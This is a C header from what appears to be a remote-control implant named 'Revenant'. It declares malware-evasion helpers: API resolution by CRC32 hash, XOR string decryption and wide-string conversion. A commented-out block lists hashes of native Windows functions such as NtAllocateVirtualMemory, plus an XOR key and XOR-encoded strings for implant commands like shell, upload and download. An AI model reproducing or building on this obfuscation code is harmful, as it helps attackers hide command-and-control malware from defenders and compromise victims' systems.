#ifndef REVENANT_OBFUSCATION_H
#define REVENANT_OBFUSCATION_H

#include <stdint.h>
#include "Strings.h"

#define HASH(API)(crc32b((uint8_t *)API))

uint32_t crc32b(const uint8_t *str);
wchar_t *str_to_wide(const char* ascii);
void xor_dec (const char *input, char *output, const char *key, size_t size) ;
void *GetProcAddressByHash(void *dll_address, uint32_t function_hash);

#endif //REVENANT_OBFUSCATION_H

/* BACKUP FOR TESTING ONLY
#define RtlRandomEx_CRC32B             0xa8c81c7d
#define RtlGetVersion_CRC32B           0xb0c9e3ff
#define RtlInitUnicodeString_CRC32B    0xe17f353f
#define NtCreateFile_CRC32b            0x962c4683
#define NtQueryInformationFile_CRC32B  0xb54956cb
#define NtAllocateVirtualMemory_CRC32B 0xec50426f
#define S_XK                     {0x50, 0x55, 0x4e, 0x49, 0x43, 0x4f, 0x44, 0x45, 0x5f, 0x53, 0x54, 0x52, 0x49, 0x4e, 0x47, 0x00}
#define S_INSTANCE_NOT_CONNECTED {0x39, 0x3b, 0x3d, 0x3d, 0x22, 0x21, 0x27, 0x20, 0x7f, 0x3d, 0x3b, 0x26, 0x69, 0x2d, 0x28, 0x6e, 0x3e, 0x30, 0x2d, 0x3d, 0x26, 0x2b, 0x65, 0x45}
#define S_COMMAND_NOT_FOUND      {0x33, 0x3a, 0x23, 0x24, 0x22, 0x21, 0x20, 0x65, 0x31, 0x3c, 0x20, 0x72, 0x2f, 0x21, 0x32, 0x6e, 0x34, 0x55}
#define S_IS_COMMAND_NO_JOB      {0x19, 0x26, 0x6e, 0x0a, 0x0c, 0x02, 0x09, 0x04, 0x11, 0x17, 0x0b, 0x1c, 0x06, 0x11, 0x0d, 0x4f, 0x12, 0x55}
#define S_TRANSPORT_FAILED       {0x04, 0x27, 0x2f, 0x27, 0x30, 0x3f, 0x2b, 0x37, 0x2b, 0x69, 0x74, 0x14, 0x28, 0x27, 0x2b, 0x65, 0x34, 0x55}
#define S_COMMAND_SHELL          {0x13, 0x3a, 0x23, 0x24, 0x22, 0x21, 0x20, 0x7f, 0x65, 0x00, 0x3c, 0x37, 0x25, 0x22, 0x47}
#define S_COMMAND_UPLOAD         {0x13, 0x3a, 0x23, 0x24, 0x22, 0x21, 0x20, 0x7f, 0x65, 0x06, 0x24, 0x3e, 0x26, 0x2f, 0x23, 0x00}
#define S_COMMAND_DOWNLOAD       {0x13, 0x3a, 0x23, 0x24, 0x22, 0x21, 0x20, 0x7f, 0x65, 0x17, 0x3b, 0x25, 0x27, 0x22, 0x28, 0x61, 0x34, 0x55}
#define S_COMMAND_EXIT           {0x13, 0x3a, 0x23, 0x24, 0x22, 0x21, 0x20, 0x7f, 0x65, 0x16, 0x2c, 0x3b, 0x3d, 0x4e}
*/
